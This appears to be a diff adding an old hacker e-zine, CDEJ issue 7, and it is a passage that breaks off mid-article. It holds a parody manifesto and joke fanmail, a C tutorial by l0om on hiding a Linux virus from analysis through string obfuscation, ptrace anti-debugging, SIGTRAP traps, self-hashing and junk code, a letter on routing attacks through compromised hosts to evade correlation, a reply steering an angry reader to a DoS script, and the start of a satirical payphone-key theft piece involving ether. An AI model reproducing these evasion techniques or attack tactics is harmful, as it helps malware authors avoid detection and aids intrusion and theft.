@@ -1,0 +1,2807 @@
+*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x
+*x               L'ELEPHANT AVEC LES TRUNKS HUGE              *x 
+*x                         izzue sept                         *x
+*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x
+*x                                                            *x
+*x                                                            *x
+*x                      *    *   *                            *x
+*x                      /\  /\  /\                            *x
+*x                     /  \/  \/  \                           *x
+*x                     \__       _/_                          *x 
+*x                    /   \____ /   \                         *x 
+*x                   /    / __ \     \                        *x
+*x                  /    |  Oo  |     \                       *x
+*x                  \___/|      |\___/\                       *x
+*x                     | |_|  |_|      \                      *x
+*x  roi des elephants  | |/|__|\|       \                     *x
+*x                     |   |__|         |\                    *x
+*x                     |   |__|   |_/  /  \                   *x
+*x                     | @ |  | @ || @ |   '                  *x
+*x                     |   |~~|   ||   |                      *x
+*x                     'ooo'  'ooo''ooo'                      *x
+*x                                                            *x
+*x                    "Veni, Vidi, Vici"                      *x
+*x                                                            *x
+*x                                                            *x
+*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x
+
+
+
+  Not even 9 months into the game and CDEJ releases its 7th issue (if you
+include the one the fedz made us take down cause of our hubble space
+telescope computer machine codes (number 5)).  As you can see from the
+content of this zine, we've matured a great deal from our beginnings
+(eliteness roughly following a natural logarithmic (ln) pattern from issue
+to issue).  We've had tons of emails flowing in (literally thousands) and
+we're trying to adjust our format to what our readers demand.  You'll see
+this reflected in this, the greatest of all CDEJ issues to date.
+
+  Cancel all of your medical appointments and call in sick to work.  You're
+about to read the next installment of the most elite zine to ever hit the
+face of this computermachine ridden planet:
+
+
+
+
+       :-o>:-o>:-o>:-o>:-o>:-o>:-o>:-o>:-o>:-o>:-o>:-o>:-o>:-o>:-
+       !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+                                  CDEJ-7
+       !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+       :-o>:-o>:-o>:-o>:-o>:-o>:-o>:-o>:-o>:-o>:-o>:-o>:-o>:-o>:-
+                            
+
+
+   AND THE WINNERS OF THE CDEJ BLUEZ LYRICS CONTEST:
+
+   HONORABLE MENTION (Sent in by BB King):
+
+
+       There's a story bout a groop that I know
+       The name is CDEJ and brings the buzz to your soul
+       Longarms trans n w01f, I love em all
+       Buzz on babe let the good times roll!
+
+       listen young haqr, gotta use a firewall
+       i say listen young haqr, gotta use a firewall
+       they'll find yer ports, and DDoS em all
+
+
+  WINNER (Sent in by Big Bill Broonzy):
+
+       i said my girl, she's gives me the blues
+       right my girl, i said she gives me the blues
+       she doesn't even know what kind of compiler to use
+
+
+  Good job and thanks to all who entered!
+
+
+x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*
+ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+  . . . . . . . . . Table of content . . . . . . . . . . . . . . 
+ . . . . . . . . . . . .  . . . . . . . . . . . . . . . . . . .
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*
+.       0000 <-> a call to reason: the cdej official communique
+o       0001 <-> fanmail
+.       0010 <-> binary shutup -- l0om
+o       0011 <-> getting payphone keys the easy way -- g-unit thugz
+.       0100 <-> peercast remote exploit -- prdelka
+o       0101 <-> udp low-level pen testing -- peanuter
+.       0110 <-> finding the ret addr -- frate
+o       0111 <-> haqing windows style -- uniter/bob
+.       1000 <-> batch DoS for onix and rotor -- afterm4th
+o       1001 <-> crossfier-server BoF -- landser
+.       1010 <-> IRC lolz
+o       1011 <-> IN THE NEWS: Peer exposed.
+.       1100 <-> a day in the life of hunt3r
+o       
+x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*
+ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*
+
+
+              SOME NOTES
+
+   G's up!: afterm4th, my foot doctor, longarms 
+
+   Hoes down!: bantown (l4me) 
+
+
+   NEW ASCII: :?D == l'elephant ascii (elephant for all you
+              non-french folks)
+
+   Most disturbing page on the entire internet:
+     http://www.acaseofcuriosities.com/cock_robin_gerrard.html
+       [is 404 but hope it comes back for you to
+         freak out over]
+
+ ----------------------------------------------------------
+
+
+
+      "A Call to Reason"
+       CDEJ Official Communique
+                    By: CDEJ (eliter than you) Senior Staff
+
+0000x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0000
+ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+0000x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0000
+:?
+:> "A Call to Reason": CDEJ official communique 
+:o CDEJ Senior Staff (eliter than you by leaps and bounds) 
+:?
+0000x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0000
+ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+0000x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0000
+
+   BEHOLD AND WITNESS, those who read this document, this which
+   is the official PROCLAMATION and LETTER OF INTENT concerning
+   the future of CDEJ and CDEJ member states; the words within
+   are no less than the movement of CDEJ from its widely
+   admired position in the computer underground to an overt
+   existence as a world renowned hacking into computer machines
+   authority.
+
+   REGARDING the current social state of hacking into computer
+   machines, CDEJ takes no stance.  As an autonomous body
+   with goals unrelated to what is largely considered "the
+   hacking community", CDEJ recognizes no entities nor social
+   classes other than CDEJ and anti-CDEJ.  Abstract concepts
+   such as "black hat" and "white hat" do thus not exist in
+   the lexicon of CDEJ politics, and are irrelevant to our
+   goals.
+
+   What then, are the goals and motivations of this powerful
+   force that has developed over the years, that has come
+   to be known as CDEJ?  No less than the subjugation of
+   power in the computer machine community.  It is at this
+   time appropriate to state COMMUNIQUE POINT NUMBER ONE:
+
+   "CDEJ DOES NOT AFFILIATE IN CONCEPT WITH ANY EXISTING
+   POLITICAL OR SOCIAL ENTITIES.  CDEJ IS IN AND OF ITSELF,
+   A SOCIAL PHENOMENON OF ADEQUATE STATURE TO STAND WITHOUT
+   ASSISTANCE OR AFFILIATION."
+
+   It should be pointed out that although CDEJ has strong
+   ties to the American Republican Party and political
+   republican ideology, we do not participate actively
+   in government politics of any kind.
+
+   PERTAINING TO the overall goals of CDEJ as an organization
+   and the pervasive CDEJ social movement, we have distinct
+   purpose and bearing.
+
+   While CDEJ assimilates no political or social goals in
+   and of themselves, we reserve the right to voice opinion
+   when political or social policies or activities relate
+   to these aforementioned goals.
+
+   These goals, stated, comprise COMMUNIQUE POINT NUMBER
+   TWO:
+
+   "CDEJ EXISTS ENTIRELY FOR THE ADVANCEMENT OF MEMBERS,
+   MEMBER INTEREST, AND HAQING INTO COMPUTER MACHINES."
+
+   We may surmise in corollary then, by the combined
+   observations of communique points one and two, that CDEJ
+   is in definition a usurping entity, and will tend to
+   remain benign concerning rival computer groups.
+
+   TO CONCLUDE, CDEJ will exist as long as the interests
+   of the corollaries are subject to external change.  We
+   reserve the right to maintain the status of CDEJ and
+   the goals of the corollaries by any mean necessary, but
+   never by exceeding necessary means.
+
+                          We Shall Rise!
+                          La Guerre et La Vie!
+
+     Monkey Longarms,
+       Revolutionary at Arms
+
+     Transient,
+       Minister of Information
+
+     The w01f,
+       Minister of Public Relations
+
+0001x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0001
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+0001x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0001
+:?
+:> Fanmail
+:o (Please stop bothering us)
+:?
+0001x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0001
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+0001x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0001
+
+
+  Dear CDEJ:
+
+   Congrats, you've made the textfiles.com database!
+Consider yourselves proud!
+
+       - Jason Scott (Pvt 1st Class, US Peace Corps)
+
+
+  Dear Jackass:
+
+  You've listed us as 'Elephants Have Huge Trunks'.
+This is not only blatantly incorrect, but very
+moronic.  While I suppose that it's impossible to
+expect every 2-bit operation to have a translations
+department (as of course CDEJ has), you could at
+least try spending a little time getting to know
+the Web2.0 sensation that is 'babelfish'.
+
+      - :?D dumb0 l'elephant
+
+---------------------------------------------
+
+  Dear CDEJ:
+
+  Hi!  Just a note to say thanks for all the
+inspiration.  If I was half as creative as
+you guys, I'd be rich by now!
+
+      - Linus Torvalds
+
+
+  Dear Linus:
+
+  Yeah dood we know.
+
+    - CDEJ
+
+---------------------------------------------
+
+  Dear CDEJ:
+
+So one thing I've noticed is that while everyone is using graphs
+(inspired by Halvar) to look at programs, few people are using
+graphs in their exploit frameworks. For example, right now,
+CANVAS is basically a tree structure. 1.1.1.1 attacks 2.2.2.2
+which attacks 3.3.3.3, etc. But networks aren't a tree structure.
+Networks are a confusing graph. The host 3.3.3.3 is the same host
+for both 1.1.1.1 and 2.2.2.2, for example. Displaying your captured
+machines and their knowledge of the world as a graph instead of a
+tree structure allows the attacker to do more complex things
+with less brain-cycles.
+
+For example, dragging a file from one host to another can take
+the shortest route between those two nodes over your covert
+network. And you should be able to establish multiple connections
+around your covert network with a simple drag of the mouse.
+That way, if someone pulls the plug on one of your nodes while
+you're hacking, you still have another way to get deeper into the
+network. You just tell it to route some other way, or make it
+do auto-route detection.
+
+A lot of security products are championing correlation of attacks.
+Well, they pretty much have for the last 6 years. I'm not sure
+how much the correlation of attacks stuff got used in the market,
+but it's been around, and there is that wacky govt project to do
+similar things on a bigger scale (http://cryptome.org/traceback.htm).
+To combat this, once you know that N nodes have the same world view
+with respect to a third node, you can attack that third node from N
+nodes at once (routed in Y ways over your covert network, ideally,
+but we don't have this implemented).
+
+In other words: if you go into next month's CANVAS and hack a few
+boxes, say, box A and box B. It'll pop up two new Nodes. You can
+then select those nodes, and a target C, and click on any exploit.
+That exploit will hack box C by doing random connections from
+both box A and box B. Right now this is most useful for simple things
+like portscans, in which an IDS (or human with tethereal) does
+correlation as part of their default setup. But as defenses get
+more complex with regards to attack correlation, this will make
+their lives really hard. :>
+
+And it's fun to see on the network. :>
+
+Dave Aitel [dave@immunityinc.com]
+
+
+   Dear Dave:
+
+  Your English really pisses me off.
+
+     - Dr Longarm
+
+---------------------------------------------
+
+  Dear CDEJ:
+
+  Hi my name is otix and i irc alot and i like efnet
+and undernet and these guys in #cdej make me mad a lot and i want to get
+even with them do you have an advice on how to get even with them i tried
+dos and using whois information but i am out of idea thanks
+
+    - otix
+
+
+  Dear otix:
+
+  There is a fantastic batch DoS program in this issue!  You are in luck! 
+Today's modern young genius comptuer haqr needs more resources than the
+computer haqrs before him ever needed!  No need to bother with pesky books
+and knowledge otix; you can simply relax and enjoy the scripts in this issue
+of CDEJ!
+
+   - :D?
+
+
+0010x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0010
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+0010x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0010
+:?
+:> Binary Shutup
+:o l0om
+:?
+0010x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0010
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+0010x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0010
+
+
+                     __           __           __
+  .-----.--.--.----.|  |.--.--.--|  |.-----.--|  |  .-----.----.-----.
+  |  -__|_   _|  __||  ||  |  |  _  ||  -__|  _  |__|  _  |   _|  _  |
+  |_____|__.__|____||__||_____|_____||_____|_____|__|_____|__| |___  |
+   by l0om - member of excluded-team                           |_____|
+   [ED NOTE: We don't care about yer st00pid grewps. edit that out pls.k.thx]
+
+   TRYING TO MAKE YOUR BINARY SHUT UP
+
+   0x00  short intro
+   0x01  hiding strings
+   0x02  Prevent tracing
+   0x03  Prevent from changing our code
+   0x04  Confusing
+   ret   end
+
+
+0x00 short intro
+################
+
+Once i have written a small virus on a linux box for infecting ELF binarys. When i was ready i started to think about how to prevent someone from detecting the sence of the program itself. I tryed to prevent the techniqs i use on new binarys before i execute them on my box. That are thinks like dumping strings, debugging etc..
+
+Most of the things i have written down are of course well known and most of the techniqs are stolen by sources of viruses, trojans, textfiles and stuff like that.
+
+
+
+0x01 Hiding strings
+###################
+
+ One of our aims is to prevent someone from viewing strings which can be found in the binary.
+ Those could include IP addresses, shell commands or filenames which could lead someone to detect eg payload, trigger or even the whole propose of the program itself. Furthermore think of software where hard coded pathnames can be found. A found pathname like "/tmp/.antivir_pid.%d" could lead someone to try to put up a symlink attack (nearly the same could happen to shell command strings).
+
+ Mostly someone will try to dump cleartext strings with the "strings" utiltiy. In "strings"  manaul is meantioned that it will show all strings which are four or more bytes long.
+
+ Lets take a small example:
+ #include <stdio.h>
+
+ void main(void) {
+ FILE *fd = fopen("/etc/passwd", "r");
+ if(fd == NULL) return;
+ else printf("file opend\n");
+ }
+
+ admin@box:~> strings k
+ /lib/ld-linux.so.2
+ libc.so.6
+ printf
+ fopen
+ _IO_stdin_used
+ __libc_start_main
+ __gmon_start__
+ GLIBC_2.1
+ GLIBC_2.0
+ PTRh0
+ /etc/passwd
+ file opend
+
+ As the pathname is longer than four bytes the strings command dumps the path in cleartext.
+
+ How to prevent this?
+ One simple method would be to cut the string in parts about three bytes and put them together dynamicly if needed. The "strings" utility would show nothing. An example:
+
+ #include <stdio.h>
+ #include <string.h>
+
+ #define ETC_PASSWD "3412"  // put the parts together in this combination
+
+ static char *bstr(char *construct);
+
+ void main(int argc, char **argv)
+ {
+   FILE *fd;
+   fd = fopen(bstr(ETC_PASSWD), "r");
+   if(fd == NULL) return;
+   else printf("file opend\n");
+ }
+
+ static char *bstr(char *construct)
+ {
+   char *ptr, *part, *finstr;
+   size_t nlen;
+
+   nlen = strlen(construct);
+   if(!nlen) return NULL;
+   finstr = (char *)malloc(1);
+
+   ptr = construct;
+   while(nlen--) {
+    switch(*ptr++) {
+    case '3':
+     part = "/et";
+     break;
+    case '4':
+     part = "c/";
+     break;
+    case '1':
+     part = "pas";
+     break;
+    case '2':
+     part = "swd";
+     break;
+    }
+
+    finstr = (char *)realloc(finstr, strlen(finstr)+strlen(part));
+    strcat(finstr, part);
+    }
+    return finstr;
+ }
+
+ admin@box:~> strings newk
+ strings test
+ /lib/ld-linux.so.2
+ libc.so.6
+ printf
+ malloc
+ strcat
+ realloc
+ fopen
+ _IO_stdin_used
+ __libc_start_main
+ strlen
+ __gmon_start__
+ GLIBC_2.1
+ GLIBC_2.0
+ PTRh
+ QVh\
+ 3412
+ file opend
+
+ Anyone have seen a path?
+
+ Another method is to save the string encrypted and decrypt the string "on the fly" if needed. In this case we dont need a strong encryption because our iam is simple: no one should see the string in plaintext.
+
+ #include <stdio.h>
+
+ #define CCHAR(x)  ((x)+10)   // rot13 like ascii shifting
+ #define DCHAR(x)  ((x)-10)
+
+ static char *bstr(char *chiffer, int nbytes);
+
+ void main(void) {
+ char filename[] = { CCHAR('/'), CCHAR('e'), CCHAR('t'), CCHAR('c'), CCHAR('/'),
+                     CCHAR('p'), CCHAR('a'), CCHAR('s'), CCHAR('s'), CCHAR('w'),
+                     CCHAR('d'), '\0' };
+
+ FILE *fd = fopen(bstr(filename,11), "r");
+ if(fd == NULL) return;
+ else printf("file opend\n");
+ }
+
+ static char *bstr(char *chiffer, int nbytes)
+ {
+  char *ptr;
+
+  ptr = chiffer;
+  while(nbytes--) *ptr = DCHAR(*ptr++);
+  return(chiffer);
+ }
+
+
+ The macro CCHAR shifts the ascii character plus 10. This way the string isnt saved in the binary in cleartext.
+ As you can see the DCHAR macro is used to decrypt the string and "Tadaa!" - "strings" utility will show us nothing.
+
+
+
+0x02 Prevent tracing
+####################
+
+All this preventing from dumping strings does not prevent from simple trace the program and find out what it is doing. for normal "trace" programs like "strace" or "ltrace" work with the "ptrace" function.
+
+<from the ptrace manual>
+      "The ptrace system call provides a means by which a  parent
+       process  may  observe and control the execution of another
+       process, and examine and change its core image and  regis
+       ters.  It is primarily used to implement breakpoint debug
+       ging and system call tracing."
+</from the ptrace manual>
+
+lets see how this works with our test program:
+
+admin@box:~> strace ./test
+[...]
+brk(0x806a674)                          = 0x806a674
+brk(0)                                  = 0x806a674
+brk(0x806b000)                          = 0x806b000
+open("/etc/passwd", O_RDONLY)           = 3
+fstat64(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 1), ...}) = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x4001a000
+write(1, "file opend\n", 11file opend
+[...]
+
+crap... all this hiding for nothing?
+
+we can prevent a process from beeing traced like this. Just read the manual further:
+
+<from the manual>
+   PTRACE_TRACEME
+              Indicates that this process is to be traced by  its
+              parent.   Any  signal (except SIGKILL) delivered to
+              this process will cause it to stop and  its  parent
+              to  be  notified  via  wait.   Also, all subsequent
+              calls to exec by this process will cause a  SIGTRAP
+              to  be  sent  to  it, giving the parent a chance to
+              gain control before the new program  begins  execu
+              tion.   A  process  probably  shouldn't  make  this
+              request if its parent isn't expecting to trace  it.
+</from the maual>
+
+mh.. so lets implement this to our code to prevent beeing "ptraced"...
+
+#include <stdio.h>
+#include <sys/ptrace.h>
+
+void main(void)
+{
+ FILE *fd;
+ if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1)
+ {
+   printf("so you wanna trace me?...\n");
+   return(-1);
+ }
+
+ fd = fopen("/etc/passwd", "r");
+ if(fd == NULL) return;
+ else printf("file opend\n");
+ exit(-1);
+}
+
+admin@box:~> strace ./test
+[...]
+close(3)                                = 0
+munmap(0x4001a000, 58768)               = 0
+ptrace(PTRACE_TRACEME, 0, 0x1, 0)       = -1 EPERM (Operation not permitted)
+fstat64(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 1), ...}) = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x4001a000
+write(1, "so you wanna trace me?...\n", 26so you wanna trace me?...
+) = 26
+munmap(0x4001a000, 4096)                = 0
+exit_group(26)                          = ?
+[...]
+
+Suprice! So we prevented the guy from ptrace us and this could also have been a evil trigger.
+
+by the way: if someone is trying to "debug" us with eg "gdb" and he is using breakepoints this can be detected too. on linux/*nix the debuger sends the process on every breakpoint a singal called SIGTRAP which will cause the process to sleep. we can simply put up a signal handler for the SIGTRAP signal and cause our program to quit.
+
+#include <stdio.h>
+#include <signal.h>
+
+static void sig_trp(int sig);
+
+void main(void)
+{
+    if(signal(SIGTRAP, sig_trp) == SIG_ERR) {
+        perror("signal");
+        exit(-1);
+    }
+    sleep(10);
+    printf("iam done\n");
+}
+
+static void sig_trp(int sig)
+{
+    printf("... AND THIS IS YOUR LAST BREAKPOINT!\n");
+    exit(-1);
+}
+
+
+
+0x03 Prevent from changing our code
+###################################
+
+We have seen how to prevent from "trace" our program. Now we come to the point where we have to think more about skilled people who could now view the hex code and "nop" out "jmps" or "cmps" and cause the program to do what ever they want. they could eg noop out the whole ptrace function call.
+
+gdb ./test
+GNU gdb 5.3.92
+[...]
+This GDB was configured as "i586-suse-linux"...
+(gdb) disas main
+Dump of assembler code for function main:
+0x080483ec <main+0>:    push   %ebp
+0x080483ed <main+1>:    mov    %esp,%ebp
+0x080483ef <main+3>:    sub    $0x8,%esp
+0x080483f2 <main+6>:    and    $0xfffffff0,%esp
+0x080483f5 <main+9>:    mov    $0x0,%eax
+0x080483fa <main+14>:   sub    %eax,%esp
+0x080483fc <main+16>:   push   $0x0                 <--- push the arguments on the stack
+0x080483fe <main+18>:   push   $0x1
+0x08048400 <main+20>:   push   $0x0
+0x08048402 <main+22>:   push   $0x0
+0x08048404 <main+24>:   call   0x80482dc 	     <--- execute it - the return = %eax
+0x08048409 <main+29>:   add    $0x10,%esp
+0x0804840c <main+32>:   cmp    $0xffffffff,%eax      <--- ptrace() == -1?
+0x0804840f <main+35>:   jne    0x8048423 <main+55>
+[...]
+
+We need some method to make clear our code has not been changed or even cracked. lets think for a moment about the binary itself:
+
+
+File Offset               File
+           0 +-----------------------------+
+             |          ELF Header         |
+             +-----------------------------+
+             |     Program header table    |
+       0x100 +-----------------------------+
+             |          Text Segment       |
+             |             [...]           |
+             |          0x2be00 bytes      |
+     0x2bf00 +-----------------------------+
+             |          Data Segment       |
+             |             [...]           |
+             |          0x4e00 bytes       |
+     0x30d00 +-----------------------------+
+             |          Segment n          |
+             |             [...]           |
+             |          0x???? bytes       |
+     0x????? +-----------------------------+
+	     |      Section header table   |
+	     |            index            |
+	     +-----------------------------+
+
+
+First there comes the ELF Header which is something like a roadmap for the file itself. It includes offset to the Section header (if there is one), how many entries there are and the same for the Program header table. Detailed descriptions on the ELF format can be found in the internet.
+
+What we should take care of are the Segments. Every Elf file includes varius Segments what builds the program itself (maybe with some linker help).
+
+badass@home:~> readelf --segments test
+
+Elf file type is EXEC (Executable file)
+Entry point 0x80482b0
+There are 6 program headers, starting at offset 52
+
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08048034 0x08048034 0x000c0 0x000c0 R E 0x4
+  INTERP         0x0000f4 0x080480f4 0x080480f4 0x00013 0x00013 R   0x1
+      [Requesting program interpreter: /lib/ld-linux.so.2]
+  LOAD           0x000000 0x08048000 0x08048000 0x004f9 0x004f9 R E 0x1000
+  LOAD           0x0004fc 0x080494fc 0x080494fc 0x00108 0x0010c RW  0x1000
+  DYNAMIC        0x00050c 0x0804950c 0x0804950c 0x000c8 0x000c8 RW  0x4
+  NOTE           0x000108 0x08048108 0x08048108 0x00020 0x00020 R   0x4
+
+ Section to Segment mapping:
+  Segment Sections...
+   00
+   01     .interp
+   02     .interp .note.ABI-tag .hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .rodata
+   03     .data .eh_frame .dynamic .ctors .dtors .jcr .got .bss
+   04     .dynamic
+   05     .note.ABI-tag
+
+badass@home:~>
+
+.interp: includes the path to the binarys interpret.
+.note: includes programmers and licence notes.
+.init: includes program code which is executed before the main part of the program
+.fini: includes program code which is executed after the main part of the program
+.data: includes the variables- lets say the programs data.
+.got: the global offset table.
+.bss: lets call this the heap...
+.text: includes the program code instructions.
+
+STOP! Thats what we are looking for. If someone trys to modify our code in some hex editor he will modify the ".text" segment. Lets think about the following. We will create a hash value of the ".text" segment and let the binary itself check for a viald hash value on every run.
+
+The hash may be somethin like:
+
+long llhash(char *buf, size_t len)  // yes- this may be the stupides|lames hash you have ever seen...
+{
+    int i = 0;
+    char *ptr;
+    unsigned long hash = 0x0defaced;
+
+    ptr = buf;
+    while(len--) {
+       hash = (hash << i) ^ *ptr++;
+     //  if(!(i%4)) hash = hash ~ *ptr;
+       if(!((i+=2)%8)) hash = (hash >> 16);
+     }
+    return(hash);  // give the hash back to read_text
+}
+
+Then we have to read the ".text" segment and therefor we should include the elf.h which includes all needed structures for handling the ELF binary. I have written down a small example for getting the ".text" segment.
+the argument "me" is the targets filename.
+
+long read_text(char *me)
+{
+    int fd, i;
+    Elf32_Ehdr hdr;           //elf header
+    Elf32_Shdr shdr, strtab;  //section header
+    char *ptr, buf[1];
+    off_t soff, strsecoff;
+    size_t nbytes;
+
+    if( (fd = open(me, O_RDONLY)) == -1) {
+        perror("open");
+        return(-1);
+    }
+
+    /*
+   elf execution view
+
+   ELF header
+   Program header table
+   Segment 1
+   ...
+   Segment n
+   Section header table (optimal)
+
+   */
+
+    read(fd, &hdr, sizeof(hdr));  //read elf header
+    soff = hdr.e_shoff + hdr.e_shstrndx * hdr.e_shentsize; //e_shstrndx holds the section header table index of the entry associated with the section name string table
+    lseek(fd, soff, SEEK_SET);  // "Lets go!" --rancid
+    read(fd, &strtab, sizeof(strtab)); //read string secteion
+    strsecoff = strtab.sh_offset;      // give me string section offset
+    nbytes = strtab.sh_size;           // and the size
+
+    // printf("string table offset %p with %d bytes\n",strsecoff,strtab.sh_size);
+
+    /*lseek(fd, strsecoff, SEEK_SET);   // dump all strings
+    while(nbytes-- && read(fd, buf, 1) != -1)
+        printf("%x",buf[0]);
+    printf("\ndone\n");
+*/
+
+    /* hdr.e_shoff: gives the byte offset form beginning of file to secion hader table
+       hdr.e_shnum: tells how many entries the secion header table contains
+       hdr.e_shentsize: gives the size in bytes of each entry
+       hdr.e_phoff: holds the program header tables file offset in bytes
+       hdr.e_phentsize: holds the size in bytes of one entry in files program header table
+       hdr.e_phnum: holds the number of entries in the pogram header
+     */
+
+    for(i = 0; i < hdr.e_shnum; i++) {  // for every section header
+
+    lseek(fd, hdr.e_shoff + (i * hdr.e_shentsize), SEEK_SET); // go to every section header
+
+	if(read(fd, &shdr, sizeof(shdr)) == -1) { //read the stuff
+	    perror("read");
+	    return(-1);
+	}
+
+     lseek(fd, shdr.sh_name + strsecoff, SEEK_SET);  // sh_name + the string table offset gives us the location of the string- like ".text"
+     read(fd, buf, 6);
+     if(!strncmp(buf, ".text", 5)) {  // is ".text" ?
+	 lseek(fd, shdr.sh_offset, SEEK_SET); // if yes go there
+	 ptr = (char *)malloc(shdr.sh_size);
+	 if(ptr == NULL) {
+	     perror("malloc");
+	     return(-1);
+	 }
+	 if(read(fd, ptr, shdr.sh_size) <= 0) {   //read .text -> ptr
+	     perror("read");
+	     return(-1);
+	 }
+         return(llhash(ptr, shdr.sh_size)); // hash it
+     }
+    }
+    return(0);
+}
+
+
+We will have to write down our program till there is nothn more to do. Then include read_me with argv[0] as target and put it into a "if" statement. Now another program must calculate the hash and print it on the screen. Well put the hash into our "if" statement and recompile it. done.
+
+But wait a second? cant the guy just eg. "nop" out the "if" statement where the hash is checked? Of curse he can. We always have to life with the fact that we CANT prevent crackers from their job. All we can do is making it harder to crack.
+
+0x04 Confusing  (if you cannot convince then confuse)
+##############
+
+Back to the example which was about disassembeld output:
+
+[...]
+0x08048409 <main+29>:   add    $0x10,%esp
+0x0804840c <main+32>:   cmp    $0xffffffff,%eax      <--- ptrace() == -1?
+0x0804840f <main+35>:   jne    0x8048423 <main+55>
+[...]
+
+Lets think about confusing the badguy with nonsence functions like this:
+
+[...]
+srand(time(0));
+if( (rand()%88) > 100) exit(-1);
+[...]
+
+This if will never exit because its impossible that the result is greater then 100. But for sure the debugging guy will be confused by stuff like this.
+You can think of every other nonsence stuff to make the crackers job more complicated.
+
+[...]
+for(i = 100; i; i--);
+i+=0xbad00bad;
+i+=0xh4h4h4h4;
+i = (i | i);
+[...]
+
+Creating nonsence in sourcecodes is my easiest job :D
+
+
+ret end
+#######
+
+greets to the excluded.org guys.
+greets to peps like: proxy, maximilian, detach, murfie, johnny, !ntruder
+		     and all other geeks/freaks i know.
+greets to my friends and family.
+
+last but not least:
+	greets to all cyberpunks out there
+	       "Phree the cyberspace!"
+
+
+0011x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0011
+ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+0011x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0011
+:?
+:> Getting Payphone Keys the Easy Way
+:o G-unit thugz (haqrs on wellfare)
+:?
+0011x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0011
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+0011x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0011
+
+
+/* PRIVATE - DO NOT DISTRIBUTE - PRIVATE - DO NOT DISTRIBUTE - PRIVATE
+*
+* the following document is a PRIVATE exploit. If I gave you this
+* exploit then please DO NOT GIVE IT TO ANYONE.
+*
+* PRIVATE - DO NOT DISTRIBUTE - PRIVATE - DO NOT DISTRIBUTE - PRIVATE */
+[ED NOTE: lawell]
+
+.,----=+| Getting Payphone keys the EASY way By G-unit thugz |+=----,.
+
+
+Hello. I am g-unit thugz and I am here to tell you the REAL way to get 
+payphone keys. This is the very best way to get keys. Accept no substitutes. If
+you have stolen payphone keys before and have not used this method then you 
+have risked your freedom. If this method is used correctly then you will NEVER
+get cought. EVER. What you will learn in this article will involve social
+engeneering, ninja skills and balls.
+
+Here are the essential items you will need for this to work correctly:
+
+1) Payphone (duh)
+2) Ether
+3) Rag for ether
+3) Ninja Mask and robe
+4) Dill Pickle (must be dill.. no sliced or baby dills will do)
+5) Paitence
+6) Balls (optional)
+7) Ninja sword
+
+If you dont have any balls then this mission will be some what hard to
